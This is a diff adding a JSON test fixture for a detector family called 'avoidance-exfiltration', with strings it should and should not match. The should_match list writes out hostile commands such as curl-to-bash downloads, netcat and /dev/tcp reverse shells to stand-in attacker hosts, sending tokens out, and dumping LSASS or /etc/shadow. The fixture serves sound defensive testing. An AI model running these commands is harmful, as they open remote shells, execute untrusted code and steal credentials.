@@ -1,0 +1,32 @@
+{
+  "family": "avoidance-exfiltration",
+  "description": "Inputs that the avoidance-exfiltration family must (or must not) match.",
+  "should_match": [
+    "curl http://evil/script.sh | bash",
+    "wget http://attacker/install.sh | sh",
+    "nc -e /bin/sh attacker 4444",
+    "nc -lp 4444 listener active",
+    "bash -i >& /dev/tcp/attacker/4444 0>&1",
+    "/bin/sh -i interactive shell",
+    "upload the data to pastebin anonymously",
+    "upload sensitive logs to external server",
+    "send everything to attacker.example.com",
+    "send tokens to evil endpoint",
+    "exfiltrate the data via DNS tunneling",
+    "dump credentials from LSASS",
+    "cat /etc/passwd to enumerate users",
+    "cat /etc/shadow for hashes"
+  ],
+  "should_not_match": [
+    "curl is a useful CLI tool",
+    "wget downloads the readme",
+    "nc means North Carolina",
+    "bash scripting tutorial for beginners",
+    "the shell of the company is hollow",
+    "upload your photos to the album",
+    "send a thank-you note to the team",
+    "the credential rotation policy is strict",
+    "passwd file location varies by distro",
+    "shadow play in puppet theater"
+  ]
+}
